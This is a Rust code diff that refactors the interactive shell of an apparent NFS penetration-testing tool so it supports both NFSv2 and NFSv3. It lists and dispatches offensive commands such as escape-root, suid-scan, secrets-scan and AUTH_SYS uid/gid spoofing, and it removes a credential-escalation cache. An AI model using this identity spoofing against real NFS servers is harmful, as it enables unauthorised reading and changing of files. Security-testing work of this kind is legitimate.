@@ -9,6 +9,8 @@ pub(crate) mod ops;
 pub(crate) mod v2;
 pub(crate) mod v3;
 
+use ops::{ShellDeviceType, ShellEntry, ShellFileInfo, ShellFileType, ShellHandle, ShellOps};
+
 use std::io::Write as _;
 #[cfg(unix)]
 use std::os::unix::fs::PermissionsExt as _;
@@ -20,15 +22,9 @@ use indicatif::{MultiProgress, ProgressBar, ProgressStyle};
 use sha2::{Digest, Sha256};
 
 use colored::Colorize as _;
-use nfswolf_nfs3::wire::{CREATE3args, GETATTR3args, LOOKUP3args, MKDIR3args, MKNOD3args, Nfs3Option, Nfs3Result, READ3args, READLINK3args, WRITE3args, createhow3, devicedata3, diropargs3, filename3, mknoddata3, nfsstat3, sattr3, set_atime, set_mtime, specdata3, stable_how};
-use nfswolf_nfs3::{Nfs3Error, Nfs3Fault};
-use nfswolf_xdr::Opaque;
 
-use crate::engine::credential::credential_ladder_with;
 use crate::engine::file_handle::FileHandleAnalyzer;
-use crate::proto::auth::{AuthSys, Credential};
-use crate::proto::nfs3::types::{DirEntryPlus, FileAttrs, FileHandle, FileType};
-use crate::proto::nfs3::{Nfs3Client, PooledNfs3 as _};
+use crate::proto::nfs3::types::FileHandle;
 use crate::util::utmp::{LastlogRecord, UTMP_RECORD_SIZE, UtType, UtmpRecord, parse_lastlog, parse_passwd, parse_utmp};
 
 /// Maximum bytes to read in a single `cat` command.
@@ -43,7 +39,7 @@ const CHUNK_SIZE: u32 = 65_536; // 64 KiB
 /// Mirrors the FUSE side's `MAX_READDIR_ENTRIES`.
 const MAX_DIR_ENTRIES: usize = 1_000_000;
 
-/// All commands available in the interactive shell (for Tab completion of the first token).
+/// All commands available in the NFSv3 interactive shell (for Tab completion of the first token).
 pub(crate) const V3_SHELL_COMMANDS: &[&str] = &[
     "ls",
     "cd",
@@ -89,45 +85,75 @@ pub(crate) const V3_SHELL_COMMANDS: &[&str] = &[
     "quit",
 ];
 
+/// Commands available in the NFSv2 shell (Tab completion).
+///
+/// Excludes `uid`/`gid`/`hostname`/`impersonate` (identity changes require
+/// reconnection on V2's `DirectTransport`) and `mknod` (not in NFSv2).
+/// The unified dispatch still handles these with a clear error message.
+pub(crate) const V2_SHELL_COMMANDS: &[&str] = &[
+    "ls",
+    "cd",
+    "pwd",
+    "tree",
+    "find",
+    "cat",
+    "get",
+    "put",
+    "rm",
+    "mkdir",
+    "rmdir",
+    "mv",
+    "cp",
+    "chmod",
+    "chown",
+    "stat",
+    "readlink",
+    "symlink",
+    "link",
+    "whoami",
+    "suid-scan",
+    "world-writable",
+    "secrets-scan",
+    "last",
+    "lastb",
+    "lastlog",
+    "escape-root",
+    "mount-handle",
+    "handle",
+    "root",
+    "lcd",
+    "lls",
+    "lpwd",
+    "lmkdir",
+    "history",
+    "help",
+    "exit",
+    "quit",
+];
+
 /// Interactive NFS shell  --  browse and extract files from an NFS export.
 ///
 /// Maintains a current working directory handle and path string so that
 /// relative `cd` and `ls` operations feel like a local shell. Stores the
 /// export root handle separately so `cd /` and absolute paths always work.
-pub(crate) struct NfsShell {
-    /// Pool-backed NFS client used for all RPC calls.
-    nfs3: Arc<Nfs3Client>,
-    /// Export root handle -- the handle returned by MOUNT. Used for `cd /` and
-    /// absolute path resolution. File handles are bearer tokens (RFC 1094 sec. 2.3.3).
-    export_root: FileHandle,
-    /// File handle for the current directory.
-    cwd: FileHandle,
-    /// Human-readable path of the current directory (best-effort).
+pub(crate) struct NfsShell<O: ShellOps> {
+    ops: O,
+    export_root: ShellHandle,
+    cwd: ShellHandle,
     cwd_path: String,
-    /// When false, write operations are refused with an informative message.
     allow_write: bool,
-    /// AUTH_SYS machine name sent with every RPC call.
-    /// Changeable mid-session via the `hostname <name>` command.
     hostname: String,
-    /// In-session command history for the `history` command.
     history: Vec<String>,
-    /// Shared state for the Tab completer. Updated after every successful cd.
-    /// The Mutex is std (not tokio) so the sync completer can lock it without
-    /// block_in_place overhead.
     tab_cache: Arc<Mutex<complete::TabCache>>,
-    /// Credential winners from prior escalation walks. Keyed by file handle
-    /// bytes so a repeat access to the same inode skips straight to the
-    /// identity that worked last time. Flushed when the user changes identity
-    /// via `uid`, `gid`, `hostname`, or `impersonate`.
-    cred_cache: Mutex<std::collections::HashMap<Vec<u8>, (u32, u32)>>,
+    commands: &'static [&'static str],
 }
 
-impl NfsShell {
-    /// Create a new shell rooted at `root_fh` on the given client.
+impl<O: ShellOps> NfsShell<O> {
+    /// Create a new shell rooted at `root` with the given ops backend.
     #[must_use]
-    pub(crate) fn new(nfs3: Arc<Nfs3Client>, root_fh: FileHandle, allow_write: bool, hostname: String) -> Self {
-        let tab_cache = Arc::new(Mutex::new(complete::TabCache { cwd: root_fh.as_bytes().to_vec(), entries: Vec::new() }));
-        Self { nfs3, export_root: root_fh.clone(), cwd: root_fh, cwd_path: "/".to_owned(), allow_write, hostname, history: Vec::new(), tab_cache, cred_cache: Mutex::new(std::collections::HashMap::new()) }
+    pub(crate) fn new(ops: O, root: ShellHandle, allow_write: bool, hostname: String, commands: &'static [&'static str]) -> Self {
+        let tab_cache = Arc::new(Mutex::new(complete::TabCache { cwd: root.as_bytes().to_vec(), entries: Vec::new() }));
+        Self { ops, export_root: root.clone(), cwd: root, cwd_path: "/".to_owned(), allow_write, hostname, history: Vec::new(), tab_cache, commands }
     }
 
     /// Return the current directory path for use in the prompt.
@@ -136,84 +162,23 @@ impl NfsShell {
         &self.cwd_path
     }
 
-    /// Current AUTH_SYS UID. Reflects mid-session `uid` / `impersonate` changes
-    /// so the prompt stays accurate (the credential lives on `self.nfs3`).
+    /// Current AUTH_SYS UID. Reflects mid-session `uid` / `impersonate` changes.
     #[must_use]
     pub(crate) fn current_uid(&self) -> u32 {
-        self.nfs3.uid()
+        self.ops.uid()
     }
 
     /// Current AUTH_SYS GID. Reflects mid-session `gid` / `impersonate` changes.
     #[must_use]
     pub(crate) fn current_gid(&self) -> u32 {
-        self.nfs3.gid()
-    }
-
-    /// If a prior escalation walk found a winner for this handle, return a
-    /// client configured with that identity. Lets callers skip the full ladder
-    /// on repeat access to the same inode.
-    fn cached_client(&self, fh: &FileHandle) -> Option<Nfs3Client> {
-        let lock = self.cred_cache.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
-        let (uid, gid) = *lock.get(fh.as_bytes())?;
-        drop(lock);
-        Some(self.nfs3.with_credential(Credential::Sys(AuthSys::with_groups(uid, gid, &[gid], self.nfs3.machinename())), uid, gid))
-    }
-
-    /// Record the (uid, gid) that succeeded for `fh` so future accesses can
-    /// skip directly to this identity.
-    fn cache_winner(&self, fh: &FileHandle, uid: u32, gid: u32) {
-        let mut lock = self.cred_cache.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
-        // Previous value (if any) from the HashMap is not needed.
-        let _ = lock.insert(fh.as_bytes().to_vec(), (uid, gid));
-    }
-
-    /// READDIRPLUS with credential cache: try the cached winner first, then
-    /// fall back to the full ladder. Records the winner on success.
-    async fn list_dir_cached(&self, dir_fh: &FileHandle) -> anyhow::Result<Vec<DirEntryPlus>> {
-        if let Some(client) = self.cached_client(dir_fh) {
-            match try_readdirplus(&client, dir_fh).await {
-                Ok(v) => return Ok(v),
-                Err(e) if !is_nfs_acces(&e) => return Err(e),
-                Err(_) => {},
-            }
-        }
-        match list_dir_with_winner(&self.nfs3, dir_fh).await {
-            Ok((entries, winner)) => {
-                if let Some((uid, gid)) = winner {
-                    self.cache_winner(dir_fh, uid, gid);
-                }
-                Ok(entries)
-            },
-            Err(e) => Err(e),
-        }
-    }
-
-    /// Read file with credential cache: try the cached winner first, then
-    /// fall back to the full ladder. Records the winner on success.
-    async fn read_all_cached(&self, fh: &FileHandle) -> anyhow::Result<Vec<u8>> {
-        if let Some(client) = self.cached_client(fh) {
-            match read_all(&client, fh).await {
-                Ok(buf) => return Ok(buf),
-                Err(e) if !is_nfs_acces(&e) => return Err(e),
-                Err(_) => {},
-            }
-        }
-        match read_all_escalated_with_winner(&self.nfs3, fh).await {
-            Ok((buf, winner)) => {
-                if let Some((uid, gid)) = winner {
-                    self.cache_winner(fh, uid, gid);
-                }
-                Ok(buf)
-            },
-            Err(e) => Err(e),
-        }
+        self.ops.gid()
     }
 
     /// Build a Tab completer that shares the directory cache with this shell.
     ///
     /// Call once after construction; pass the result to rustyline `Editor::set_helper`.
     pub(crate) fn make_completer(&self) -> complete::ShellCompleter {
-        complete::ShellCompleter::new(Box::new(v3::Nfs3RemoteCompleter { nfs3: Arc::clone(&self.nfs3) }), self.export_root.as_bytes().to_vec(), Arc::clone(&self.tab_cache), V3_SHELL_COMMANDS)
+        complete::ShellCompleter::new(self.ops.make_completer(), self.export_root.as_bytes().to_vec(), Arc::clone(&self.tab_cache), self.commands)
     }
 
     /// Refresh the Tab completion cache with the current directory's entries.
@@ -221,10 +186,7 @@ impl NfsShell {
     /// Called after every successful `cd` so Tab completion is immediately
     /// accurate in the new directory without an extra RPC on the first Tab press.
     pub(crate) async fn refresh_tab_cache(&self) {
-        let entries = match try_readdirplus(&self.nfs3, &self.cwd).await {
-            Ok(es) => es.into_iter().filter(|e| e.name != "." && e.name != "..").map(|e| e.name).collect(),
-            Err(_) => Vec::new(),
-        };
+        let entries = self.ops.list_dir(&self.cwd).await.map_or_else(|_| Vec::new(), |es| es.into_iter().filter(|e| e.name != "." && e.name != "..").map(|e| e.name).collect());
         if let Ok(mut cache) = self.tab_cache.lock() {
             cache.cwd = self.cwd.as_bytes().to_vec();
             cache.entries = entries;
@@ -294,6 +256,7 @@ impl NfsShell {
             "mount-handle" => self.cmd_mount_handle(arg).await,
             // Handle info
             "handle" => println!("{}", self.cwd.to_hex()),
+            "root" => self.cmd_root().await,
             // Local ops
             "lcd" => self.cmd_lcd(arg),
             "lls" => self.cmd_lls(arg),
@@ -301,7 +264,7 @@ impl NfsShell {
             "lmkdir" => self.cmd_lmkdir(arg),
             // Session
             "history" => self.cmd_history(),
-            "help" | "?" => print_help(),
+            "help" | "?" => self.print_help(),
             "exit" | "quit" => {},
             _ => eprintln!("{}", format!("unknown command: {cmd}  (try 'help')").yellow()),
         }
@@ -325,10 +288,9 @@ impl NfsShell {
         let target = if path_str.is_empty() { None } else { Some(path_str) };
 
         // Resolve the target. `ls <dir>` lists the directory; `ls <file>`
-        // shows just that one entry (real `ls` semantics) instead of failing
-        // with NFS3ERR_NOTDIR from a READDIRPLUS on a non-directory handle.
-        let all_entries: Vec<DirEntryPlus> = match target {
-            None => match self.list_dir_cached(&self.cwd.clone()).await {
+        // shows just that one entry (real `ls` semantics).
+        let all_entries: Vec<ShellEntry> = match target {
+            None => match self.ops.list_dir(&self.cwd).await {
                 Ok(v) => v,
                 Err(e) => {
                     eprintln!("{}", format!("ls: {e}").red());
@@ -336,15 +298,15 @@ impl NfsShell {
                 },
             },
             Some(p) => {
-                let (fh, attrs) = match self.lookup_path(p).await {
+                let (fh, info) = match self.lookup_path(p).await {
                     Ok(pair) => pair,
                     Err(e) => {
                         eprintln!("{}", format!("ls: {p}: {e}").red());
                         return;
                     },
                 };
-                if attrs.file_type == FileType::Directory {
-                    match self.list_dir_cached(&fh).await {
+                if info.file_type == ShellFileType::Directory {
+                    match self.ops.list_dir(&fh).await {
                         Ok(v) => v,
                         Err(e) => {
                             eprintln!("{}", format!("ls: {p}: {e}").red());
@@ -352,17 +314,16 @@ impl NfsShell {
                         },
                     }
                 } else {
-                    // Single non-directory: synthesize a one-row listing.
                     let name = p.rsplit('/').find(|s| !s.is_empty()).unwrap_or(p).to_owned();
-                    vec![DirEntryPlus { fileid: attrs.fileid, name, cookie: 0, attrs: Some(attrs), handle: Some(fh) }]
+                    vec![ShellEntry { name, info: Some(info), handle: Some(fh) }]
                 }
             },
         };
 
         // Separate . and .. (always pinned first) from the remaining entries.
-        let mut dot: Option<&DirEntryPlus> = None;
-        let mut dotdot: Option<&DirEntryPlus> = None;
-        let mut rest: Vec<&DirEntryPlus> = Vec::with_capacity(all_entries.len());
+        let mut dot: Option<&ShellEntry> = None;
+        let mut dotdot: Option<&ShellEntry> = None;
+        let mut rest: Vec<&ShellEntry> = Vec::with_capacity(all_entries.len());
         for e in &all_entries {
             if e.name == "." {
                 dot = Some(e);
@@ -374,17 +335,15 @@ impl NfsShell {
         }
 
         // Stable sort the non-dot entries, then optionally reverse.
-        rest.sort_by(|a, b| ls_cmp(a, b, sort));
+        rest.sort_by(|a, b| ls_cmp_shell(a, b, sort));
         if reverse {
             rest.reverse();
         }
 
         if all_cols {
-            // Extended header: all 13 fattr3 fields.
             println!("{:>10}  {:<10}  {:>4}  {:>8}  {:>8}  {:>12}  {:>12}  {:>11}  {:<19}  {:<19}  {:<19}  name", "inode", "mode", "nlink", "uid", "gid", "size", "used", "rdev", "atime", "mtime", "ctime");
             println!("{}", "-".repeat(148).dimmed());
         } else {
-            // Default header: the most useful columns for everyday browsing.
             let time_label = match sort {
                 LsSort::Ctime => "ctime",
                 LsSort::Atime => "atime",
@@ -394,37 +353,35 @@ impl NfsShell {
             println!("{}", "-".repeat(75).dimmed());
         }
 
-        let print_entry = |entry: &DirEntryPlus| {
-            let tc = entry.attrs.as_ref().map_or('?', type_char);
-            let mode_str = entry.attrs.as_ref().map_or_else(|| "?????????".to_owned(), |a| format_mode(a.mode));
-            let uid = entry.attrs.as_ref().map_or(0u32, |a| a.uid);
-            let gid = entry.attrs.as_ref().map_or(0u32, |a| a.gid);
-            let size = entry.attrs.as_ref().map_or(0u64, |a| a.size);
+        let print_entry = |entry: &ShellEntry| {
+            let tc = entry.info.as_ref().map_or('?', |a| a.file_type.letter());
+            let mode_str = entry.info.as_ref().map_or_else(|| "?????????".to_owned(), |a| format_mode(a.mode));
+            let uid = entry.info.as_ref().map_or(0u32, |a| a.uid);
+            let gid = entry.info.as_ref().map_or(0u32, |a| a.gid);
+            let size = entry.info.as_ref().map_or(0u64, |a| a.size);
             let name_str = colorize_name(&entry.name, tc);
 
             if all_cols {
-                let nlink = entry.attrs.as_ref().map_or(0u32, |a| a.nlink);
-                let inode = entry.attrs.as_ref().map_or(entry.fileid, |a| a.fileid);
-                let used = entry.attrs.as_ref().map_or(0u64, |a| a.used);
-                let rdev = entry.attrs.as_ref().map(|a| if a.file_type == FileType::Block || a.file_type == FileType::Character { format!("{}:{}", a.rdev.0, a.rdev.1) } else { "-".to_owned() });
+                let nlink = entry.info.as_ref().map_or(0u32, |a| a.nlink);
+                let inode = entry.info.as_ref().map_or(0u64, |a| a.fileid);
+                let used = entry.info.as_ref().map_or(0u64, |a| a.used);
+                let rdev = entry.info.as_ref().map(|a| if a.file_type == ShellFileType::Block || a.file_type == ShellFileType::Character { format!("{}:{}", a.rdev.0, a.rdev.1) } else { "-".to_owned() });
                 let rdev_str = rdev.unwrap_or_else(|| "-".to_owned());
-                let atime = entry.attrs.as_ref().map_or_else(|| "????-??-?? ??:??:??".to_owned(), |a| fmt_unix_time(a.atime.seconds));
-                let mtime = entry.attrs.as_ref().map_or_else(|| "????-??-?? ??:??:??".to_owned(), |a| fmt_unix_time(a.mtime.seconds));
-                let ctime = entry.attrs.as_ref().map_or_else(|| "????-??-?? ??:??:??".to_owned(), |a| fmt_unix_time(a.ctime.seconds));
+                let atime = entry.info.as_ref().map_or_else(|| "????-??-?? ??:??:??".to_owned(), |a| fmt_unix_time(a.atime_secs));
+                let mtime = entry.info.as_ref().map_or_else(|| "????-??-?? ??:??:??".to_owned(), |a| fmt_unix_time(a.mtime_secs));
+                let ctime = entry.info.as_ref().map_or_else(|| "????-??-?? ??:??:??".to_owned(), |a| fmt_unix_time(a.ctime_secs));
                 println!("{inode:>10}  {tc}{mode_str}  {nlink:4}  {uid:8}  {gid:8}  {size:12}  {used:12}  {rdev_str:>11}  {atime}  {mtime}  {ctime}  {name_str}");
             } else {
-                // Show the sorted-by timestamp so the displayed value matches the sort key.
-                let time_secs = entry.attrs.as_ref().map(|a| match sort {
-                    LsSort::Ctime => a.ctime.seconds,
-                    LsSort::Atime => a.atime.seconds,
-                    _ => a.mtime.seconds,
+                let time_secs = entry.info.as_ref().map(|a| match sort {
+                    LsSort::Ctime => a.ctime_secs,
+                    LsSort::Atime => a.atime_secs,
+                    _ => a.mtime_secs,
                 });
                 let time_str = time_secs.map_or_else(|| "????-??-?? ??:??:??".to_owned(), fmt_unix_time);
                 println!("{tc}{mode_str}  {uid:8}  {gid:8}  {size:12}  {time_str}  {name_str}");
             }
         };
 
-        // Emit . then .. (pinned), then sorted rest.
         if let Some(e) = dot {
             print_entry(e);
         }
@@ -462,9 +419,9 @@ impl NfsShell {
             return;
         }
 
-        match lookup_path_from(&self.nfs3, &start_fh, rel).await {
-            Ok((fh, attrs)) => {
-                if attrs.file_type != FileType::Directory {
+        match self.ops.lookup_path(&start_fh, rel).await {
+            Ok((fh, info)) => {
+                if info.file_type != ShellFileType::Directory {
                     eprintln!("{}", format!("cd: {target}: not a directory").red());
                     return;
                 }
@@ -485,7 +442,7 @@ impl NfsShell {
     async fn cmd_tree(&self, arg: &str) {
         let max_depth = arg.split_whitespace().find_map(|t| t.parse::<usize>().ok()).unwrap_or(3);
         println!("{}", self.cwd_path.bold());
-        tree_recursive(Arc::clone(&self.nfs3), self.cwd.clone(), String::new(), 0, max_depth).await;
+        tree_recursive(&self.ops, self.cwd.clone(), String::new(), 0, max_depth).await;
     }
 
     /// Find files whose names contain the pattern (case-insensitive substring).
@@ -494,7 +451,7 @@ impl NfsShell {
             eprintln!("{}", "usage: find <pattern>".yellow());
             return;
         }
-        find_recursive(Arc::clone(&self.nfs3), self.cwd.clone(), self.cwd_path.clone(), pattern.to_ascii_lowercase()).await;
+        find_recursive(&self.ops, self.cwd.clone(), self.cwd_path.clone(), pattern.to_ascii_lowercase()).await;
     }
 
     // -------------------------------------------------------------------------
@@ -514,8 +471,20 @@ impl NfsShell {
                 return;
             },
         };
-        if let Err(e) = read_escalated(&self.nfs3, &fh).await {
-            eprintln!("{}", format!("cat: {name}: {e}").red());
+        match self.ops.read_file(&fh).await {
+            Ok(data) => {
+                let mut stdout = std::io::stdout();
+                let len = data.len().min(CAT_MAX_BYTES as usize);
+                // Stdout write failure is non-fatal during cat (pipe closed, etc.).
+                drop(stdout.write_all(data.get(..len).unwrap_or(&data)));
+                if data.last().is_some_and(|&b| b != b'\n') {
+                    println!();
+                }
+                if data.len() > CAT_MAX_BYTES as usize {
+                    eprintln!("{}", format!("[!] output truncated at {CAT_MAX_BYTES} bytes -- use `get` for the full file").yellow());
+                }
+            },
+            Err(e) => eprintln!("{}", format!("cat: {name}: {e}").red()),
         }
     }
 
@@ -559,7 +528,7 @@ impl NfsShell {
         };
         let local = positional.get(1).copied().unwrap_or("");
 
-        let (fh, attrs) = match self.lookup_path(remote).await {
+        let (fh, info) = match self.lookup_path(remote).await {
             Ok(pair) => pair,
             Err(e) => {
                 eprintln!("{}", format!("get: {remote}: {e}").red());
@@ -578,14 +547,14 @@ impl NfsShell {
         }
         let dest = dest.as_str();
 
-        if recursive && attrs.file_type == FileType::Directory {
+        if recursive && info.file_type == ShellFileType::Directory {
             let mp = MultiProgress::new();
-            match download_tree(&self.nfs3, &fh, dest, &mp).await {
+            match download_tree(&self.ops, &fh, dest, &mp).await {
                 Ok(bytes) => println!("{}", format!("saved {bytes} bytes -> {dest}/").green()),
                 Err(e) => eprintln!("{}", format!("get -r: {e}").red()),
             }
         } else {
-            match download_file_escalated(&self.nfs3, &fh, dest, attrs.size).await {
+            match download_file(&self.ops, &fh, dest).await {
                 Ok((bytes, hash)) => {
                     println!("{}", format!("saved {bytes} bytes -> {dest}  sha256:{hash}").green());
                     if let Some(ref expected) = verify_hash {
@@ -637,7 +606,7 @@ impl NfsShell {
             let dir_mode = std::fs::metadata(local_path).map_or(0o755, |m| m.permissions().mode() & 0o7777);
             #[cfg(not(unix))]
             let dir_mode = 0o755;
-            let dir_fh = match create_remote_dir(&self.nfs3, &remote_parent_fh, &remote_dir_name, dir_mode).await {
+            let dir_fh = match self.ops.mkdir(&remote_parent_fh, &remote_dir_name, dir_mode).await {
                 Ok(fh) => fh,
                 Err(e) => {
                     eprintln!("{}", format!("put -r: create dir {remote}: {e}").red());
@@ -645,7 +614,7 @@ impl NfsShell {
                 },
             };
             let mp = MultiProgress::new();
-            match upload_tree(&self.nfs3, local_path, &dir_fh, &mp).await {
+            match upload_tree(&self.ops, local_path, &dir_fh, &mp).await {
                 Ok(bytes) => println!("{}", format!("put -r: {bytes} bytes -> {remote}/").green()),
                 Err(e) => eprintln!("{}", format!("put -r: {e}").red()),
             }
@@ -679,25 +648,17 @@ impl NfsShell {
         let mode = local_meta.permissions().mode() & 0o7777;
         #[cfg(not(unix))]
         let mode = if local_meta.permissions().readonly() { 0o444 } else { 0o644 };
-        let file_fh = match create_remote(&self.nfs3, &parent_fh, &filename, mode).await {
+        let file_fh = match self.ops.create_file(&parent_fh, &filename, mode).await {
             Ok(fh) => fh,
             Err(e) => {
                 eprintln!("{}", format!("put: create {remote}: {e}").red());
-                if is_nfs_rofs(&e) {
-                    print_rofs_hint();
-                }
                 return;
             },
         };
 
-        match upload_data(&self.nfs3, &file_fh, &data).await {
+        match upload_data(&self.ops, &file_fh, &data).await {
             Ok(n) => println!("{}", format!("put: {n} bytes -> {remote}").green()),
-            Err(e) => {
-                eprintln!("{}", format!("put: write error: {e}").red());
-                if is_nfs_rofs(&e) {
-                    print_rofs_hint();
-                }
-            },
+            Err(e) => eprintln!("{}", format!("put: write error: {e}").red()),
         }
     }
 
@@ -719,9 +680,9 @@ impl NfsShell {
                 return;
             },
         };
-        match self.nfs3.unlink(&parent_fh, &filename).await {
+        match self.ops.remove(&parent_fh, &filename).await {
             Ok(()) => println!("{}", format!("removed {path}").green()),
-            Err(e) => report_write_stat("rm", &e),
+            Err(e) => eprintln!("{}", format!("rm: {e}").red()),
         }
     }
 
@@ -743,9 +704,9 @@ impl NfsShell {
                 return;
             },
         };
-        match self.nfs3.create_dir(&parent_fh, &dirname, sattr3_with_mode(0o755)).await {
+        match self.ops.mkdir(&parent_fh, &dirname, 0o755).await {
             Ok(_) => println!("{}", format!("created {path}").green()),
-            Err(e) => report_write_stat("mkdir", &e),
+            Err(e) => eprintln!("{}", format!("mkdir: {e}").red()),
         }
     }
 
@@ -767,9 +728,9 @@ impl NfsShell {
                 return;
             },
         };
-        match self.nfs3.remove_dir(&parent_fh, &dirname).await {
+        match self.ops.rmdir(&parent_fh, &dirname).await {
             Ok(()) => println!("{}", format!("removed {path}").green()),
-            Err(e) => report_write_stat("rmdir", &e),
+            Err(e) => eprintln!("{}", format!("rmdir: {e}").red()),
         }
     }
 
@@ -793,9 +754,9 @@ impl NfsShell {
             },
         };
 
-        match self.nfs3.rename_entry(&from_fh, &from_name, &to_fh, &to_name).await {
+        match self.ops.rename(&from_fh, &from_name, &to_fh, &to_name).await {
             Ok(()) => println!("{}", format!("{src} -> {dst}").green()),
-            Err(e) => report_write_stat("mv", &e),
+            Err(e) => eprintln!("{}", format!("mv: {e}").red()),
         }
     }
 
@@ -811,7 +772,7 @@ impl NfsShell {
             return;
         }
 
-        let (src_fh, src_attrs) = match self.lookup_path(src).await {
+        let (src_fh, src_info) = match self.lookup_path(src).await {
             Ok(p) => p,
             Err(e) => {
                 eprintln!("{}", format!("cp: {src}: {e}").red());
@@ -819,7 +780,7 @@ impl NfsShell {
             },
         };
 
-        let data = match read_all(&self.nfs3, &src_fh).await {
+        let data = match self.ops.read_file(&src_fh).await {
             Ok(d) => d,
             Err(e) => {
                 eprintln!("{}", format!("cp: read {src}: {e}").red());
@@ -835,26 +796,17 @@ impl NfsShell {
             },
         };
 
-        let src_mode = src_attrs.mode;
-        let dst_fh = match create_remote(&self.nfs3, &parent_fh, &filename, src_mode).await {
+        let dst_fh = match self.ops.create_file(&parent_fh, &filename, src_info.mode).await {
             Ok(fh) => fh,
             Err(e) => {
                 eprintln!("{}", format!("cp: create {dst}: {e}").red());
-                if is_nfs_rofs(&e) {
-                    print_rofs_hint();
-                }
                 return;
             },
         };
 
-        match upload_data(&self.nfs3, &dst_fh, &data).await {
+        match upload_data(&self.ops, &dst_fh, &data).await {
             Ok(n) => println!("{}", format!("copied {n} bytes {src} -> {dst}").green()),
-            Err(e) => {
-                eprintln!("{}", format!("cp: write {dst}: {e}").red());
-                if is_nfs_rofs(&e) {
-                    print_rofs_hint();
-                }
-            },
+            Err(e) => eprintln!("{}", format!("cp: write {dst}: {e}").red()),
         }
     }
 
@@ -887,10 +839,9 @@ impl NfsShell {
             },
         };
 
-        let attrs = sattr3 { mode: Nfs3Option::Some(mode), uid: Nfs3Option::None, gid: Nfs3Option::None, size: Nfs3Option::None, atime: set_atime::DONT_CHANGE, mtime: set_mtime::DONT_CHANGE };
-        match self.nfs3.set_attrs(&fh, attrs).await {
+        match self.ops.set_mode(&fh, mode).await {
             Ok(()) => println!("{}", format!("mode set to {mode_str} on {path}").green()),
-            Err(e) => report_write_stat("chmod", &e),
+            Err(e) => eprintln!("{}", format!("chmod: {e}").red()),
         }
     }
 
@@ -920,10 +871,9 @@ impl NfsShell {
             },
         };
 
-        let attrs = sattr3 { mode: Nfs3Option::None, uid: uid_opt.map_or(Nfs3Option::None, Nfs3Option::Some), gid: gid_opt.map_or(Nfs3Option::None, Nfs3Option::Some), size: Nfs3Option::None, atime: set_atime::DONT_CHANGE, mtime: set_mtime::DONT_CHANGE };
-        match self.nfs3.set_attrs(&fh, attrs).await {
+        match self.ops.set_owner(&fh, uid_opt, gid_opt).await {
             Ok(()) => println!("{}", format!("ownership set on {path}").green()),
-            Err(e) => report_write_stat("chown", &e),
+            Err(e) => eprintln!("{}", format!("chown: {e}").red()),
         }
     }
 
@@ -936,10 +886,8 @@ impl NfsShell {
                 return;
             },
         };
-        let args = GETATTR3args { object: fh.to_nfs_fh3() };
-        match self.nfs3.getattr(&args).await {
-            Ok(Nfs3Result::Ok(ok)) => print_stat(if name.is_empty() { "." } else { name }, &FileAttrs::from_fattr3(&ok.obj_attributes)),
-            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("stat: {stat:?}").red()),
+        match self.ops.getattr(&fh).await {
+            Ok(info) => print_stat(if name.is_empty() { "." } else { name }, &info),
             Err(e) => eprintln!("{}", format!("stat: {e}").red()),
         }
     }
@@ -957,10 +905,8 @@ impl NfsShell {
                 return;
             },
         };
-        let args = READLINK3args { symlink: fh.to_nfs_fh3() };
-        match self.nfs3.readlink(&args).await {
-            Ok(Nfs3Result::Ok(ok)) => println!("{}", String::from_utf8_lossy(ok.data.0.as_ref())),
-            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("readlink: {stat:?}").red()),
+        match self.ops.readlink(&fh).await {
+            Ok(target) => println!("{target}"),
             Err(e) => eprintln!("{}", format!("readlink: {e}").red()),
         }
     }
@@ -985,9 +931,9 @@ impl NfsShell {
             },
         };
 
-        match self.nfs3.create_symlink(&parent_fh, &link_filename, target, sattr3_with_mode(0o777)).await {
+        match self.ops.symlink(&parent_fh, &link_filename, target).await {
             Ok(()) => println!("{}", format!("{linkname} -> {target}").green()),
-            Err(e) => report_write_stat("symlink", &e),
+            Err(e) => eprintln!("{}", format!("symlink: {e}").red()),
         }
     }
 
@@ -1018,9 +964,9 @@ impl NfsShell {
             },
         };
 
-        match self.nfs3.hard_link(&target_fh, &parent_fh, &link_filename).await {
+        match self.ops.hard_link(&target_fh, &parent_fh, &link_filename).await {
             Ok(()) => println!("{}", format!("{linkname} => {existing}").green()),
-            Err(e) => report_write_stat("link", &e),
+            Err(e) => eprintln!("{}", format!("link: {e}").red()),
         }
     }
 
@@ -1031,12 +977,17 @@ impl NfsShell {
     /// Switch UID mid-session -- creates a new pool slot, no reconnect needed.
     /// AUTH_SYS credentials are client-asserted (RFC 5531 sec. 14).
     fn cmd_uid(&mut self, arg: &str) {
+        if !self.ops.supports_identity_change() {
+            eprintln!("{}", format!("uid: identity changes not supported on {}", self.ops.version_name()).red());
+            return;
+        }
         match arg.parse::<u32>() {
             Ok(uid) => {
-                let gid = self.nfs3.gid();
-                let cred = Credential::Sys(AuthSys::new(uid, gid, &self.hostname));
-                self.nfs3 = Arc::new(self.nfs3.with_credential(cred, uid, gid));
-                self.cred_cache.lock().unwrap_or_else(std::sync::PoisonError::into_inner).clear();
+                let gid = self.ops.gid();
+                if let Err(e) = self.ops.change_identity(uid, gid, &self.hostname) {
+                    eprintln!("{}", format!("uid: {e}").red());
+                    return;
+                }
                 println!("{}", format!("uid={uid} gid={gid} hostname={}", self.hostname).green());
             },
             Err(_) => eprintln!("{}", format!("uid: invalid number: {arg}").red()),
@@ -1045,12 +996,17 @@ impl NfsShell {
 
     /// Switch GID mid-session.
     fn cmd_gid(&mut self, arg: &str) {
+        if !self.ops.supports_identity_change() {
+            eprintln!("{}", format!("gid: identity changes not supported on {}", self.ops.version_name()).red());
+            return;
+        }
         match arg.parse::<u32>() {
             Ok(gid) => {
-                let uid = self.nfs3.uid();
-                let cred = Credential::Sys(AuthSys::new(uid, gid, &self.hostname));
-                self.nfs3 = Arc::new(self.nfs3.with_credential(cred, uid, gid));
-                self.cred_cache.lock().unwrap_or_else(std::sync::PoisonError::into_inner).clear();
+                let uid = self.ops.uid();
+                if let Err(e) = self.ops.change_identity(uid, gid, &self.hostname) {
+                    eprintln!("{}", format!("gid: {e}").red());
+                    return;
+                }
                 println!("{}", format!("uid={uid} gid={gid} hostname={}", self.hostname).green());
             },
             Err(_) => eprintln!("{}", format!("gid: invalid number: {arg}").red()),
@@ -1067,28 +1023,38 @@ impl NfsShell {
             println!("{}", self.hostname);
             return;
         }
+        if !self.ops.supports_identity_change() {
+            eprintln!("{}", format!("hostname: identity changes not supported on {}", self.ops.version_name()).red());
+            return;
+        }
